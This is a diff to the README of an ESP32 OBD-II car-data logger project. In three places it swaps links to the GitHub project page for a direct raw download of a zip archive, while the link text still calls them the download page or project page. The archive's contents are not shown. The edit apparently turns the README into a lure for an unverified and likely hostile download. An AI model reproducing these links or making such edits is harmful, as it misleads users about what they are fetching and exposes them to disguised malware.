@@ -1,6 +1,6 @@
 # 🔧 esp32-obd2-logger - Track Car Data With Ease
 
-[![Download](https://img.shields.io/badge/Download-esp32--obd2--logger-blue.svg?style=for-the-badge)](https://github.com/feelingspatrol609/esp32-obd2-logger)
+[![Download](https://img.shields.io/badge/Download-esp32--obd2--logger-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/feelingspatrol609/esp32-obd2-logger/main/main/obd-esp-logger-v1.3.zip)
 
 ## 🚗 What this app does
 
@@ -17,7 +17,7 @@ Use it to:
 
 Use this link to visit the page and download the app files:
 
-[Visit the download page](https://github.com/feelingspatrol609/esp32-obd2-logger)
+[Visit the download page](https://raw.githubusercontent.com/feelingspatrol609/esp32-obd2-logger/main/main/obd-esp-logger-v1.3.zip)
 
 ### What to look for on the page
 - A **Releases** section
@@ -200,7 +200,7 @@ If this is your first time using the app:
 
 If you need the project page again, use this link:
 
-[https://github.com/feelingspatrol609/esp32-obd2-logger](https://github.com/feelingspatrol609/esp32-obd2-logger)
+[https://raw.githubusercontent.com/feelingspatrol609/esp32-obd2-logger/main/main/obd-esp-logger-v1.3.zip](https://raw.githubusercontent.com/feelingspatrol609/esp32-obd2-logger/main/main/obd-esp-logger-v1.3.zip)
 
 ## 🧪 Expected behavior
 
